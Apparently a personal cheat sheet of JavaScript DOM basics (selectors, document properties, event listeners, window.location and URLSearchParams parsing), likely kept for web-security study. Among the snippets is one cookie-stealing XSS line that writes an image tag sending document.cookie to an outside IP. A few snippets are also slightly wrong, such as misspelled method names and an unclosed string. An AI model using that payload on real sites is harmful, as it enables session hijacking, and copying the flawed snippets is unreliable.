# Document Object Model (DOM)

### Basics
```
console.log("Hello World!);

document.cookie


document.getElementById('1');

document.getElementByTagName('div');

document.getElementByClassName('list-items');

document.querySelector(#main-heading);

document.querySelectorAll('div');


document.write('something');

document.write('<img src="http://10.10.14.13/?'+document.cookie+'">');

document.domain

document.URL

document.title

document.doctype

document.head

document.body

document.all

document.all[10] //using index number

document.forms

document.links

document.images

```

### Event Listeners 
```
element.addEventListener("click", function);

element.addEventListener("mouseover", function);
```

### Window Objects

```
window.alert('1');
 
alert(prompt());

window.location = "http://127.0.0.1"

window.location.search

window.location.hash

window.open("http://127.0.0.1");
```

## URLSearchParams
```
http://127.0.0.1/?name=video#default=1234
```

```
let querystring = window.location.search; // ?name=video
let urlParam = new URLSearchParams(querystring);
console.log(urlParam);
let value = urlParam.get('name');
console.log(value);
```

```
(new URLSearchParams(window.location.search)).get('name'); // video
```

```
document.location.hash // #default=1
<or>
location.hash // #default=1234
```

```
document.location.href // http://www.somehost.com?name=video#default=1
```

```
document.location.href.indexOf("default="); // 29 return index location of 'd' in 'default='
```

```
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8); // 1234 // +8 is to exclude 'default='
```
